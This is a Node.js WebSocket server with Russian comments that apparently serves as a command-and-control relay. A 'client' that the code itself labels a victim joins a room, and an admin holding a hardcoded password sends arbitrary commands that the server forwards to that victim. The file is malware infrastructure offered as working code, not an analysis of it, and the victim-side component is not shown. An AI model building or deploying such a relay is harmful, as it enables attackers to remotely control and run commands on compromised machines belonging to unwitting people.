const express = require('express');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Пароль администратора (можно сменить)
const ADMIN_PASSWORD = '7355608';

// Хранилище: roomCode -> { client: WebSocket, admin: WebSocket }
const rooms = new Map();

wss.on('connection', (ws) => {
  console.log('Новое подключение');

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      const { type, room, password, command } = data;

      if (type === 'client') {
        // Клиент (жертва) подключается к комнате
        if (!rooms.has(room)) {
          rooms.set(room, { client: null, admin: null });
        }
        const roomData = rooms.get(room);
        if (roomData.client) {
          ws.send(JSON.stringify({ error: 'В этой комнате уже есть клиент' }));
          return;
        }
        roomData.client = ws;
        ws.room = room;
        ws.type = 'client';
        console.log(`Клиент подключился к комнате ${room}`);
        ws.send(JSON.stringify({ status: 'connected', role: 'client' }));
      } 
      else if (type === 'admin') {
        // Администратор подключается с паролем
        if (password !== ADMIN_PASSWORD) {
          ws.send(JSON.stringify({ error: 'Неверный пароль' }));
          return;
        }
        if (!rooms.has(room)) {
          rooms.set(room, { client: null, admin: null });
        }
        const roomData = rooms.get(room);
        if (roomData.admin) {
          ws.send(JSON.stringify({ error: 'Администратор уже подключён' }));
          return;
        }
        roomData.admin = ws;
        ws.room = room;
        ws.type = 'admin';
        console.log(`Администратор подключился к комнате ${room}`);
        ws.send(JSON.stringify({ status: 'connected', role: 'admin' }));
      }
      else if (type === 'command') {
        // Администратор отправляет команду
        if (ws.type !== 'admin') {
          ws.send(JSON.stringify({ error: 'Только администратор может отправлять команды' }));
          return;
        }
        const roomData = rooms.get(ws.room);
        if (!roomData || !roomData.client) {
          ws.send(JSON.stringify({ error: 'Клиент не подключён' }));
          return;
        }
        // Пересылаем команду клиенту
        roomData.client.send(JSON.stringify({ command }));
        console.log(`Команда "${command}" отправлена клиенту в комнате ${ws.room}`);
      }
    } catch (e) {
      console.error('Ошибка обработки сообщения:', e);
    }
  });

  ws.on('close', () => {
    if (ws.room && rooms.has(ws.room)) {
      const roomData = rooms.get(ws.room);
      if (ws.type === 'client') {
        roomData.client = null;
        console.log(`Клиент покинул комнату ${ws.room}`);
      } else if (ws.type === 'admin') {
        roomData.admin = null;
        console.log(`Администратор покинул комнату ${ws.room}`);
      }
      // Если комната пуста, можно удалить
      if (!roomData.client && !roomData.admin) {
        rooms.delete(ws.room);
      }
    }
  });
});

app.get('/', (req, res) => {
  res.send('Сервер управления работает!');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});
